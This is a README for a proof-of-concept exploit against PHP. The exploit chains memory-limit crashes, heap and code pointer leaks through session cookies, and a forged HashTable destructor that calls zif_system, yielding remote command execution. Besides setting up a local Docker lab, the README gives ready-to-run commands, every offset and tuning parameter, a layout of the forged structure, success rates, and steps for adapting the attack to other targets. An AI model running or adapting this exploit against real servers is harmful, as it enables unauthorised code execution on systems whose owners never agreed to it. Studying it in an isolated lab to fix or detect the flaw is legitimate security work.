# PHP Memory-Limit Exploit PoC

> Remote code execution via PHP's memory-limit error path: leak heap and code pointers through session cookies, then forge a callback to `zif_system`.

A single standard-library Python script that chains four HTTP requests into arbitrary command execution against a PHP server. No dependencies beyond Python 3.11+ and Docker.

```
  stage                 what goes out                        what comes back
  ---------------------------------------------------------------------------
  0  health      GET /index.php                       ->  HTTP 200 reachable
  1  heap leak   ~249 KiB producer + 8 consumers      ->  256 B cookie
                 (OOM poisons a worker)                   -> Zend chunk base
  2  code leak   ~251 KiB producer + 8 consumers      ->   16 B cookie
                 (OOM poisons a worker)                   -> zval_ptr_dtor
  3  callback    ~369 KiB POST                        ->  forged HashTable runs
                 (fake HashTable + command)               -> zif_system(cmd)
  ---------------------------------------------------------------------------
  20 HTTP requests at most. No looping, no retries.
```

## Contents

- [Repository layout](#repository-layout)
- [Quick start](#quick-start)
- [The lab](#the-lab)
- [poc.py reference](#pocpy-reference)
  - [Required arguments](#required-arguments)
  - [Image and platform](#image-and-platform)
  - [Heap layout](#heap-layout)
  - [ASLR ranges](#aslr-ranges)
  - [Producer geometry](#producer-geometry)
  - [Leak tuning](#leak-tuning)
  - [Cache and recalculation](#cache-and-recalculation)
- [Usage examples](#usage-examples)
- [How the exploit works](#how-the-exploit-works)
  - [1. Memory exhaustion](#1-memory-exhaustion)
  - [2. Heap address leak](#2-heap-address-leak)
  - [3. Code address leak](#3-code-address-leak)
  - [4. Forged callback](#4-forged-callback)
- [Reading the output](#reading-the-output)
- [Reliability](#reliability)
- [Adapting to a different target](#adapting-to-a-different-target)

---

## Repository layout

```
.
├── poc.py                     # Self-contained exploit + offset calculator
├── compose.yml                # Docker Compose lab (PHP + nginx)
├── start.sh                   # One-liner: bring up lab, run exploit
├── cache/                     # Cached calculator results (auto-populated)
├── tmp/                       # Default output directory for run artifacts
├── lab/
│   ├── nginx.conf             # Reverse proxy config (strips server headers)
│   ├── public/
│   │   └── index.php          # Health-check endpoint
│   └── test-bin               # Dummy binary executed by the callback
└── README.md
```

| File | Purpose |
| --- | --- |
| **`poc.py`** | Everything in one file: ELF binary analysis, offset calculation, Docker image extraction, and the four-stage exploit. No external imports. |
| **`compose.yml`** | Spins up an Alpine PHP CLI server behind nginx on `127.0.0.1:18166`. |
| **`start.sh`** | Convenience script: tears down any existing lab, starts fresh, runs the exploit. |
| **`cache/`** | Stores calculated offsets as human-readable JSON so repeat runs skip the Docker pull/extract/scan cycle. |
| **`tmp/`** | Default location for run output directories (`tmp/poc-run-<timestamp>`). |
| **`lab/nginx.conf`** | Proxies port 80 to the PHP built-in server on port 8000. Strips `X-Powered-By` and server version headers. |
| **`lab/public/index.php`** | Minimal PHP endpoint. The exploit's health check targets this (any HTTP 200 response is sufficient). |
| **`lab/test-bin`** | Shell script stand-in for whatever binary the callback should execute. |

---

## Quick start

```bash
# 1. Start the lab
docker compose up -d

# 2. Verify it's running
curl -s http://127.0.0.1:18166/index.php

# 3. Run the exploit
python3 poc.py \
  --url http://127.0.0.1:18166/index.php \
  --image php:8.5.11-fpm-alpine3.23 \
  --php-path /usr/local/bin/php

# 4. Tear down
docker compose down
```

Or use the one-liner:

```bash
./start.sh
```

A successful run looks like:

```
[calc] cache hit for php:8.5.11-fpm-alpine3.23
[calc] DTOR_LOW21           = 0x112930
[calc] ZIF_SYSTEM_FROM_DTOR = -0x204BC0
[calc] PHP_VERSION          = PHP/8.5.11
[health] target reachable
[heap] strict Zend base 0x7a1233c00000
[code] strict zval_ptr_dtor 0x60bc04512930
{"stage": "final", "nonce": "...", "execution_proof_verified": true, ...}

--- Response Body ---
...
HELLO WORLD
---------------------
```

Exit status is `0` on a verified run, `1` otherwise.

---

## The lab

The lab reproduces the exact conditions the exploit needs: Alpine PHP running the built-in CLI server with four workers, behind nginx.

```yaml
# compose.yml (simplified)
services:
  php-svc:
    image: php:8.5.11-fpm-alpine3.23
    command: php -S 0.0.0.0:8000 -t /app
    environment:
      - PHP_CLI_SERVER_WORKERS=4
    mem_limit: 1g

  nginx-svc:
    image: nginx:1.27-alpine
    ports:
      - "127.0.0.1:18166:80"
```

The image tag says `fpm` but the container runs `php -S` (CLI SAPI). This matters for offset calculation -- the `php` binary at `/usr/local/bin/php` has different symbol addresses than `php-fpm` at `/usr/local/sbin/php-fpm`. Use `--php-path /usr/local/bin/php` to analyze the correct binary.

The nginx layer strips `X-Powered-By` and server version headers. The exploit does not rely on these headers -- the health check only requires HTTP 200.

---

## poc.py reference

`poc.py` is fully self-contained. It does three things in sequence:

1. **Calculate** -- pull the Docker image, extract the PHP binary, scan for symbol addresses
2. **Configure** -- set all calibration globals from the calculated offsets + CLI overrides
3. **Exploit** -- health check, two leak stages, one forged callback

The health check verifies the target returns HTTP 200. It does not inspect response headers or body content.

### Required arguments

| Flag | Description |
| --- | --- |
| `--url URL` | Target endpoint (any HTTP/HTTPS URL) |
| `--image IMAGE` | Docker image to extract offsets from (e.g. `php:8.5.11-fpm-alpine3.23`) |

### Image and platform

| Flag | Default | Description |
| --- | --- | --- |
| `--platform` | `linux/amd64` | Docker platform. Use `linux/arm64` when the target runs ARM. Important on Apple Silicon where Docker defaults to `linux/arm64`. |
| `--php-path` | auto-detect | Path to the PHP binary inside the image. Auto-detection prefers `php-fpm`; pass `/usr/local/bin/php` when the target runs `php -S`. |

### Heap layout

These depend on worker count, `memory_limit`, and allocation pattern. Measure with a debugger.

| Flag | Default | Description |
| --- | --- | --- |
| `--heap-carrier-delta` | `0x8400000` | Distance from leaked chunk base to the controlled buffer |
| `--heap-carrier-offset` | `0x16D1D8` | Fine offset within the carrier region |

### ASLR ranges

Plausible virtual-address windows. Linux x86-64 defaults; ARM64 or other kernels differ.

| Flag | Default |
| --- | --- |
| `--heap-min` | `0x700000000000` |
| `--heap-max` | `0x800000000000` |
| `--code-min` | `0x500000000000` |
| `--code-max` | `0x700000000000` |

### Producer geometry

Controls the nested-name shapes that amplify wire bytes into in-memory allocations. Must overshoot `memory_limit` while staying under the 1 MiB body cap.

| Flag | Default | Description |
| --- | --- | --- |
| `--heap-depth` | `57` | Nesting depth for heap producer |
| `--heap-count` | `950` | File-control count for heap producer |
| `--heap-field-count` | `50` | Padding fields for heap producer |
| `--heap-field-value-size` | `1` | Padding field value size for heap |
| `--code-depth` | `58` | Nesting depth for code producer |
| `--code-count` | `935` | File-control count for code producer |
| `--code-field-count` | `65` | Padding fields for code producer |
| `--code-field-value-size` | `39` | Padding field value size for code |

### Leak tuning

| Flag | Default | Description |
| --- | --- | --- |
| `--consumers` | `8` | Pipelined consumers per leak stage |
| `--cookie-pairs` | `1001` | Empty cookie names on each producer |

### Cache and recalculation

Offset calculation involves Docker pull, binary extraction, and ELF scanning. Results are cached in `cache/` as human-readable JSON files:

```
cache/php_8.5.11-fpm-alpine3.23__linux_amd64__php.json
```

The cache key is derived from `--image`, `--platform`, and `--php-path`. Different combinations produce different cache files.

| Flag | Description |
| --- | --- |
| `--recalculate` | Ignore cached offsets and recalculate from the image |

---

## Usage examples

**Basic lab run**:

```bash
python3 poc.py \
  --url http://127.0.0.1:18166/index.php \
  --image php:8.5.11-fpm-alpine3.23 \
  --php-path /usr/local/bin/php
```

**Specify output directory**:

```bash
python3 poc.py \
  --url http://127.0.0.1:18166/index.php \
  --image php:8.5.11-fpm-alpine3.23 \
  --php-path /usr/local/bin/php \
  --output-dir my-run
```

**Running from ARM Mac against x86-64 target** (the `--platform` flag ensures the correct binary is analyzed):

```bash
python3 poc.py \
  --url http://127.0.0.1:18166/index.php \
  --image php:8.5.11-fpm-alpine3.23 \
  --platform linux/amd64 \
  --php-path /usr/local/bin/php
```

**Override heap layout for a different worker/memory setup**:

```bash
python3 poc.py \
  --url http://127.0.0.1:18166/index.php \
  --image php:8.5.11-fpm-alpine3.23 \
  --php-path /usr/local/bin/php \
  --heap-carrier-delta 0x8400000 \
  --heap-carrier-offset 0x16D1D8
```

**Override ASLR ranges for ARM64 target**:

```bash
python3 poc.py \
  --url http://127.0.0.1:18166/index.php \
  --image php:8.5.11-fpm-alpine3.23 \
  --platform linux/arm64 \
  --php-path /usr/local/bin/php \
  --heap-min 0x0000400000000000 --heap-max 0x0000800000000000 \
  --code-min 0x0000400000000000 --code-max 0x0000800000000000
```

**Force recalculation** (ignore cache):

```bash
python3 poc.py \
  --url http://127.0.0.1:18166/index.php \
  --image php:8.5.11-fpm-alpine3.23 \
  --php-path /usr/local/bin/php \
  --recalculate
```

---

## How the exploit works

### 1. Memory exhaustion

A `multipart/form-data` POST carries `PHPSESSID` and `PHP_SESSION_UPLOAD_PROGRESS` fields. Hundreds of empty file controls use names like `f[0][x][x]...` with dozens of nested `[x]` segments. The body stays around 250 KiB on the wire but parsing it creates deeply nested PHP arrays that overshoot the memory limit. The OOM leaves stale session state behind in a worker that gets reused.

### 2. Heap address leak

Eight pipelined consumers race for the poisoned worker. One uses a crafted value that overwrites a string length field, causing PHP to serialize 256 bytes of neighbouring heap data into the `PHPSESSID` cookie. The script requires at least four pointer-looking values in the cookie to agree on the same aligned 2 MiB Zend heap region.

### 3. Code address leak

A second producer/consumer batch triggers the same OOM with a different array shape. The target cookie is exactly 16 bytes: an eight-byte value of `16`, then a pointer whose low 21 bits match the known `zval_ptr_dtor` fingerprint for this binary. ASLR does not move the low 21 bits, so they serve as a build fingerprint.

The relative offset from `zval_ptr_dtor` to `zif_system` is fixed at link time:

```
zif_system = zval_ptr_dtor + ZIF_SYSTEM_FROM_DTOR
```

### 4. Forged callback

The final POST places a 384-byte forged `HashTable` in a controlled multipart field. The structure overlaps a fake call frame and a `zend_string` holding the command:

```
     0x00  +----------------------------+
           | zend_array header           |  pDestructor -> zif_system
     0x20  +----------------------------+
           | bucket / fake call frame    |  arg1 -> zend_string below
     0x80  +----------------------------+
           | zend_string header          |
     0x98  +----------------------------+
           | command (231 B max)         |
     0x180 +----------------------------+
```

A primer value supplies the pointer, then a long field name drives another OOM. In the cleanup path, PHP reads the forged table's `pDestructor` as `zif_system` and calls it with the string argument.

---

## Reading the output

Each run creates a directory (default: `tmp/poc-run-<UTC timestamp>`) with:

| File | Contents |
| --- | --- |
| `heap.request.http`, `code.request.http` | Raw HTTP bytes sent for each leak stage (producer + 8 consumers) |
| `heap.response.http`, `code.response.http` | Raw HTTP bytes received from each leak stage |
| `heap.json`, `code.json` | Parsed status, lengths, hashes, candidate addresses |
| `final.request.http` | The forged-callback request |
| `final.response.http` | Raw response bytes |
| `final.response.body` | Response body only |
| `final.response.headers.json` | Parsed status and headers |
| `final.json` | Callback result: nonce seen, id seen, hash seen, verified |
| `run.json` | Full run metadata: all calibration values, timing, success/failure |

`execution_proof_verified: true` means the response contained the fresh nonce, an `id` result, and a SHA-256 line for the target binary.

---

## Reliability

Both leak stages race against other workers, so a single run does not always succeed. Typical results against the four-worker lab with no other traffic:

| Result | Approximate rate |
| --- | --- |
| Full success (`execution_proof_verified: true`) | ~70% |
| Callback misses (leaks succeed, markers absent) | ~20% |
| Heap leak never lands | ~10% |

Failed runs are not retried automatically. Run it again.

---

## Adapting to a different target

The exploit has two categories of constants:

**Binary-dependent** (calculated automatically by `poc.py`):
- `DTOR_LOW21` -- low 21 bits of `zval_ptr_dtor`, used as a build fingerprint
- `ZIF_SYSTEM_FROM_DTOR` -- signed offset from `zval_ptr_dtor` to `zif_system`
- `PHP_VERSION` -- recorded in run metadata for traceability

These change with every different PHP build, distro, or compiler flag set. The built-in calculator handles this: give it `--image` and optionally `--platform` / `--php-path`.

**Runtime-dependent** (must be measured manually):
- `HEAP_CARRIER_DELTA`, `HEAP_CARRIER_OFFSET` -- distance from leaked chunk base to the controlled buffer. Changes with worker count, `memory_limit`, and allocation pattern.
- `HEAP_MIN/MAX`, `CODE_MIN/MAX` -- ASLR virtual-address windows. Kernel and architecture dependent.
- Producer geometry (`--heap-depth`, `--code-depth`, etc.) -- must overshoot `memory_limit` while staying under the 1 MiB body cap.

To adapt:
1. Change `--image` and `--php-path` to match the target
2. If the architecture differs, set `--platform` and adjust `--heap-min/max`, `--code-min/max`
3. If worker count or memory limit differs, re-measure heap layout with a debugger and override `--heap-carrier-delta/offset`
4. If the body exceeds 1 MiB or fails to trigger OOM, adjust producer geometry

---

## Thanks

Thanks to [@KillaBoi](https://github.com/KillaBoi) for his great work.
